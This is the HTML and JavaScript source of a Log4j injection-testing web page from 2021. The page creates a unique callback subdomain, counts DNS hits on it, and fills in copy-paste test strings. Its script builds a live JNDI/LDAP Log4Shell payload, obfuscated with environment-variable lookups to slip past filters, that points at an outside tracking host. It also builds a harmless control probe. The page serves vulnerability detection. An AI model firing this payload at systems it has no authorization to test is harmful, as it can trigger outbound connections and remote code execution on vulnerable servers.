<!doctype html>
<html>

<head>
  <meta charset=utf-8>
  <meta http-equiv=x-ua-compatible content="IE=Edge">
  <meta http-equiv=permissions-policy content="interest-cohort=()">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta name="theme-color" content="#2b7bb5">
  <meta name="copyright" content="Copyright (c)2021 Erik McClure">
  <meta name="keywords"
    content="games,music,code,erik mcclure,erikmcclure,aurora theory,sweetie bot,discord,feathergui,black sphere studios,tinyoal,upatch">
  <meta name="robots" content="index,follow">
  <meta name="googlebot" content="index,follow">
  <meta name="generator" content="Hand-written because I'm a maniac">
  <link rel="canonical" href="https://log4j.erikmcclure.com/"">
    <link rel=" apple-touch-icon" href="https://erikmcclure.com/favicon.ico">
  <link rel="shortcut icon" type=image/x-icon href="https://erikmcclure.com/favicon.ico">
  <meta property="og:type" content="website">
  <title>Log4j Injection Tester</title>
  <meta property="og:title" content="Log4j Injection Tester">
  <meta name="twitter:title" content="Log4j Injection Tester">
  <meta itemprop="name" content="Log4j Injection Tester">
  <meta name="description"
    content="Automatically generates a subzone URL that can be used to test for Log4j vulnerabilities.">
  <meta property="og:description"
    content="Automatically generates a subzone URL that can be used to test for Log4j vulnerabilities.">
  <meta name="twitter:description"
    content="Automatically generates a subzone URL that can be used to test for Log4j vulnerabilities.">
  <meta itemprop="description" content="Applied mathematician and software architect who occasionally writes music.">
  <meta property="og:url" content="https://log4j.erikmcclure.com">
  <meta property="og:site_name" content="Erik McClure">
  <meta property="og:image" content="https://erikmcclure.com/img/avatar.png">
  <meta property="og:locale" content="en-US">
  <meta property="article:author" content="Erik McClure">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:site" content="@erikmcclure0173">
  <meta name="twitter:creator" content="@erikmcclure0173">
  <meta name="twitter:image" content="https://erikmcclure.com/img/avatar.png">
  <meta name="twitter:dnt" content="on">
  <meta itemprop="image" content="https://erikmcclure.com/img/avatar.png">
  <meta name="last-updated" content="20211211-01:06:00.000">
  <style>
    html {
      height: 100%;
    }

    body {
      font-family: "Lucida Grande", "Lucida Sans Unicode", Helvetica, Arial, Verdana, sans-serif;
      background: #9b0000;
      background: radial-gradient(ellipse at center, #9b0000 0%, #2d0b0b 100%);
      filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#00749b', endColorstr='#2d0b0b', GradientType=1);
      background-attachment: fixed;
      color: #FFF;
      text-rendering: optimizeLegibility;
    }

    #wrapper {
      position: fixed;
      left: 0;
      right: 0;
      top: 0;
      bottom: 0;
      background: url(./tile.png);
      background-size: auto;
      z-index: -1;
      overflow-x: hidden;
      overflow-y: show;
      min-width: 305px;
    }

    main {
      display: flex;
      flex-wrap: wrap;
    }

    main section {
      flex-grow: 0.5;
      padding: 1.5em;
      position: relative;
      text-align: center;
    }

    header {
      text-align: center;
      background: #0f0000;
      box-shadow: 0 5px 10px #000;
    }

    h1 {
      font-size: 3em;
      letter-spacing: 1px;
      font-weight: 700;
      font-variant: small-caps;
      border-bottom: #471313 1px solid;
      text-shadow: 1px 1px #000;
      margin: 0;
    }

    h2 {
      margin: 0 auto;
      color: #bbb;
      font-size: 1.2em;
      max-width: 30em;
    }

    h3 {
      letter-spacing: 1px;
      margin-bottom: 2em;
    }

    p {
      margin: 0;
      width: 100%;
    }

    main {
      background: rgba(0, 0, 0, 0.7);
      border-radius: 1em;
      padding: 1.5em;
      margin: 2em;
    }

    .button {
      display: inline-block;
      background: #059900;
      background: linear-gradient(#05a300, #035f00);
      padding: 0.75em 1em;
      border-radius: 0.75em;
      text-shadow: 1px 1px #333;
      font-weight: 700;
      font-size: 1.4em;
      letter-spacing: 1px;
    }

    a:link {
      text-decoration: none;
      color: #8ce8ff;
    }

    a:hover {
      color: #d1f6ff;
      text-decoration: underline dotted;
      text-decoration-thickness: from-font;
    }

    a:active {
      color: #f7fdff;
    }

    a:visited {
      color: #acccd4
    }

    .divider {
      position: absolute;
      right: 2px;
      top: 1em;
      bottom: 1em;
      width: 1px;
      height: 100%;
      background: #666;
    }

    h5 {
      font-size: 1.25em;
      font-weight: 700;
      letter-spacing: 1px;
    }

    h5 p {
      font-size: 0.8em;
      font-weight: 500;
      letter-spacing: 0;
      color: #999;

    }

    h6 {
      color: #999;
      font-size: 1.2em;
      letter-spacing: 0.05em;
    }

    .hidden {
      display: none;
    }

    .purple {
      display: inline-block;
      background: #7014e8;
      background: linear-gradient(180deg, #7014e8 30.12%, #0e5ecf 192.47%);
      padding: 0.75em 1em;
      border-radius: 0.75em;
      text-shadow: 1px 1px #333;
      font-size: 2em;
      font-weight: 700;
      letter-spacing: 1px;
    }

    a.purple {
      color: #fff;
    }

    footer {
      position: relative;
      background: #1b0d0d;
      box-shadow: 0 0 12px #000 inset;
      margin-top: 2em;
      color: #8693AB;
      text-align: center;
      user-select: none;
      right: -4%;
      left: -4%;
      width: 108%;
    }

    footer section {
      box-shadow: 0 50vh 0 50vh #1b0d0d;
      padding: 2em;
    }

    textarea {
      overflow: auto;
      width: 100%;
      max-width: 60em;
      resize: vertical;
    }

    @media (max-width: 830px) {
      .divider {
        display: none;
      }

      main {
        flex-direction: column;
      }

      main section {
        max-width: 100% !important;
      }
    }

    @media (max-width: 420px) {
      body {
        font-size: 14px;
      }
    }

    @media (max-width: 350px) {
      body {
        font-size: 12px;
      }
    }
  </style>
</head>

<body>
  <div id="wrapper">
    <header>
      <h1>Log4j Injection Tester</h1>
    </header>
    <main>
      <p>
      <h2>Use this service to automatically generate a unique URL that will track how many DNS lookup hits occur. You
        can
        use this in a testing string to test if a particular system is vulnerable to the <a
          href="https://www.lunasec.io/docs/blog/log4j-zero-day/">Log4j security issue</a>.</h2>
      </p>
      <section id="generator" style="max-width: 40%;">
        <h3>Generate New URL!</h3>
        <a href="javascript:gennew()" class="button">&raquo; Click Here! &laquo;</a>
        <div class="divider"></div>
      </section>
      <section id="tracker" style="max-width: 40%;" class="hidden">
        <h6>Listening for:<br /><span id="url"></span></h6>
        <h5 style="color:#7bff76">Hits: <span id="hits">0</span></h5>
        <div class="divider"></div>
      </section>
      <section id="waiter" style="max-width: 60%;">
        <h6>Waiting . . .</h6>
      </section>
      <section id="helper" class="hidden" style="max-width: 60%;">
        <h3>Copy and paste these strings!</h3>
        <label for="injector" style="color:#ff5353">
          <h5>&#9888; Live Injection: &#9888;</h5>
        </label> <textarea rows="5" cols="60" name="injector" id="injector"></textarea>
        <label for="probe">
          <h5>Control Probe:<p>The control probe does not activate the Log4J vulnerability, it sends a slightly
              different but similar payload that should do nothing. This is used to catch any firewalls that try to ping
              any plaintext domains they see to eliminate false positives.</p>
          </h5>
        </label> <textarea rows="5" cols="60" name="probe" id="probe"></textarea>
      </section>
    </main>
    <footer>
      <section>
        <a href="https://dotnet.microsoft.com/en-us/learn/csharp" class="purple">Learn C# Here</a>
        <br />
        <br /><img src="meme.jpg" alt="3 billion devices run Java" style="max-width: 350px; width:100%;" />
      </section>
    </footer>
  </div>
  <script>
    var code;
    var tracker = document.getElementById("tracker");
    var generator = document.getElementById("generator");
    var waiter = document.getElementById("waiter");
    var helper = document.getElementById("helper");

    function update() {
      var r = new XMLHttpRequest();
      r.onreadystatechange = function doresponse() {
        if (r.readyState === XMLHttpRequest.DONE) {
          if (r.status === 200) {
            document.getElementById("hits").innerHTML = r.responseText;
            if (r.responseText > 0) {
              document.getElementById("hits").parentElement.style.color = '#ff5353';
            }
          } else {
            tracker.innerHTML = "ERROR: " + r.status + "<br/>Is the server down?!";
          }
        }
      };
      r.open('GET', '/id/' + code, true);
      r.send();
      setTimeout(update, 5000);
    }
    function prepwindow(cvpair) {
      waiter.classList = 'hidden';
      generator.classList = 'hidden';
      helper.classList = '';
      tracker.classList = '';
      cv = cvpair.split(",");
      code = cv[0];
      document.getElementById("url").innerHTML = cv[0];
      var envname = '';
      var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
      for (var i = 0; i < 9; i++) {
        envname += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
      }

      var prefix = "${${env:" + envname + ":-j}ndi${env:" + envname + ":-:}${env:" + envname + ":-l}dap${env:" + envname + ":-:}//";
      document.getElementById("injector").innerHTML = prefix + cv[0] + ".log4fail.erikmcclure.com/a}"
      document.getElementById("probe").innerHTML = prefix.replaceAll('$', '.') + cv[1] + ".log4fail.erikmcclure.com/a}";
      setTimeout(update, 5000);
    }
    function gennew() {
      var r = new XMLHttpRequest();
      r.onreadystatechange = function doresponse() {
        if (r.readyState === XMLHttpRequest.DONE) {
          if (r.status === 200) {
            window.history.pushState({ pagecode: r.responseText }, "Log4Fail: " + r.responseText, "#" + r.responseText);
            prepwindow(r.responseText);
          } else {
            generator.innerHTML = "ERROR: " + r.status + "<br/>Is the server down?!";
          }
        }
      };
      r.open('POST', '/id', true);
      r.send();
    }
  </script>
</body>

</html>